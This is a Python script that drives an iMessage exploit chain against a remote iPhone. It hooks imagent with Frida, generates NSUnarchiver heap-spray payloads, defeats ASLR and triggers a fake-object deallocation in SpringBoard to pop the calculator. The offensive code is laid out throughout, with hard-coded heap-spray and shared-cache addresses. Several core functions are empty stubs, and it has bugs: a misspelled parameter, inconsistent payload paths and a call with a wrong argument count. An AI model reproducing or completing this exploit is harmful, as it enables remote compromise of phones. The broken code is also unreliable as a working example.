import frida
import random
import subprocess
import sys
import time
import os

CRASH_ELAY = 10
HEAPSPRAY_ADDR = 0x140000000
SHARED_CACHE_BASE = None
SHARED_CACHE_WRITABLE_REGION_OFFSET = 0x31acc00
TARGET_APPLE_ID = 'foo@bar.baz'

# The class representin a target device to which iMessages can be sent.
class Device:
  def __init__(self, apple_id):
    self.apple_id = apple_id
    self.ready = False
    self._delivery_receipts = 0

    session = frida.attach('imagent')
    code = open('./hook.js', 'r').read()
    script = session.create_script(code)
    script.on('message', self._on_message)
    script.load()

    while not self.ready:
      time.sleep(1)

  def send_message(self):
    pass

  def send_payload_to_imagent(self):
    pass

  def send_payload_to_springboard(self):
    pass

  # The handler to cope with receiving message
  def _on_message(self, message, data):
    if message['type'] == 'send':
      payload = message['payload']
      if payload == 'READY':
        self.ready = True
      elif payload == 'DELIVERY_RECEIPT':
        self._delivery_receipts += 1
      else:
        pass

# The generator class to generate different NSUnarchiver payload and write it to /private/var/tmp/com.apple.message/payload 
class Payloads:
  @staticmethod
  def generate_calcpop_heapspray_payload(shared_cache_base):
    subprocess.check_call(['./gen_payload_calcpop.py', hex(shared_cache_base)])
    # Convert to binary format to save a few bytes.
    subprocess.check_call(['plutil', '-convert', 'binary1', '/private/var/tmp/com.apple.message/payload'])
  
  @staticmethod
  def generate_kernelpanic_heapspray_payload(shard_cache_base):
    subprocess.check_call(['/gen_payload_kernelpanic.py', hex(shared_cache_base)])
    # Convert to binary format to save a few bytes.
    subprocess.check_call(['plutil', '-convert', 'binary1', '/private/var/tmp/com.apple.message/payload'])

  @staticmethod
  def generate_addr_deref_payload(addr):
    subprocess.check_call(['/gen_payload_deref.py', hex(addr)])

  @staticmethod
  def generate_fakeobj_dealloc_trigger(addr):
    subprocess.check_call(['/gen_fakeobj_dealloc.py', hex(addr)])


class SharedCacheProfile:
  def __init__(self, zeroMap, ptrMap, tpMap):
    assert(len(zeroMap) == len(ptrMap) == len(tpMap))

    self.base = 0x180000000
    self.zeroMap = zeroMap
    self.ptrMap = ptrMap
    self.tpMap = tpMap

def break_aslr(target):
  pass

def pwn(target):
  print(f'[Info]: Start to exploit remote iPhone {TARGET_APPLE_ID} ...')
  os.makedirs('/private/var/tmp/com.apple.messages/', exist_ok=True)

  shared_cache_base = SHARED_CACHE_BASE
  # Obtain 
  if shared_cache_base is None:
    print('[Info]: Break ASLR ...')
    shared_cache_base = break_aslr(target)

  print(f'[Info]: Shared cache is mapped at 0x{shared_cache_base}')
  target.send_message(f'Your shared cache starts at 0x{shared_cache_base}')

  input('[Info]: Press enter to continue ...')

  print('[Info]: Generate payload to pop calculator ...')
  Payloads.generate_calcpop_heapspray_payload(shared_cache_base)

  SPRAYSIZE = 768 * 1024 * 1024
  MSGSIZE = 32 * 1024 * 1024
  NUM_SPRAY = SPRAYSIZE // MSGSIZE
  for i in range(NUM_SPRAY):
    target.send_payload_to_springboard()
    time.sleep(1)
    print(f'[Info]: Sending heap spray part {i + 1}/{NUM_SPRAY}')

  time.sleep(10)
  target.send_message('Enjoy the calculator!!')
  print('[Info]: Open calculator successfully!')

  Payloads.generate_fakeobj_dealloc_trigger(HEAPSPRAY_ADDR + 0x3ff8)
  target.send_payload_to_springboard()

  time.sleep(1000)


target = Device(TARGET_APPLE_ID)
pwn(target)